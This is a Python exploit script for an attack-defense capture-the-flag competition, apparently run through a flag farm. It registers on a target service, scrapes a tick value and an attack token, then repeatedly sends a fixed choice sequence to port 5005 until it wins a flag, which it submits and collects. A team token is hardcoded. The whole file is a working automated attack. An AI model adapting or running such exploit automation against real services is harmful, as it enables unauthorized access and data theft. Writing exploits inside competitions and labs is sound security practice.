from httpx import Client
from pwn import remote
from pyfarmer import random_string, farm

TEAM_TOKEN = "30351a6a5a8233465c09494d9652761d"
HEADERS = {"X-Team-Token": TEAM_TOKEN}


def main(ip: str):
    session = Client()
    auth = random_string()
    session.post(
        f"http://{ip}/register",
        data={"team_name": auth, "password": auth, "submit": "Register"},
    )
    res = session.post(
        f"http://{ip}/login",
        data={"team_name": auth, "password": auth, "submit": "Login"},
    )
    tick = res.text.split("Tick #")[1].split("</a>")[0].strip()
    res = session.post(
        f"http://{ip}/attack",
        data={"team": "Nop_Team", "tick": tick, "service": 1},
    )
    token = (
        res.text.split("Your token")[1].split("<code>")[1].split("</code>")[0].strip()
    )

    conn = remote(ip, 5005)
    conn.sendline(token.encode())
    conn.sendline(b"2")
    conn.sendline(b"2730")
    conn.sendline(b"odd")
    match = conn.recvline_regex(b"Congratz!|Gimme choice:").decode().strip()
    while match != "Congratz!":
        conn.sendline(b"2")
        conn.sendline(b"2730")
        conn.sendline(b"odd")
        match = conn.recvline_regex(b"Congratz!|Gimme choice:").decode().strip()
    flag = conn.recvline().decode().strip()

    res = session.post(
        f"http://{ip}/submit",
        data={"flag": flag, "team": "Nop_Team", "service": 1, "submit": "Send"},
    )
    real_flag = res.text.split("some points: ")[1].split(" ")[0]
    yield real_flag


if __name__ == "__main__":
    farm(main)
